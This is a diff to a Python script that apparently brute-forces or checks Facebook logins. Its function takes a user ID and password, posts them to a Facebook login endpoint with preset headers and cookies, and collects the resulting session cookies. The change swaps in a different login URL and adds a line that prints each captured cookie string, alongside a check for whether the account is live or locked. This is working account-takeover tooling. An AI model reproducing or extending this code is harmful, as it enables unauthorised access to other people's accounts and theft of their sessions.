@@ -1387,7 +1387,7 @@ def p(uid,pwx,tl):
             'fmt': '1',
             'a': 'AYrzCMozrxxEkLpLMe4Y2HjtqtsmVGwYzrN5JRYYClldhdPtYgFp1Jf_aTSnrZs9GEMJRGEqpBnp7Yr7bbjZFjK5_l3XCV2rjhwTOtu5o4lWwg',
             '_user': '0',}
-            url = 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
+            url = "https://limited.facebook.com/login/device-based/login/async/"
             Session.headers.update(headers)
             for k, v in cookies.items():
                 Session.cookies.set(k, v, domain=".facebook.com")
@@ -1397,6 +1397,7 @@ def p(uid,pwx,tl):
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                print(f" {green}Cookie : {green}{coki}")
                 check = check_lock(cid)
                 if "live" in check:
                     if "https://www.facebook.com/confirmemail.php?" in po or "confirmemail" in po:
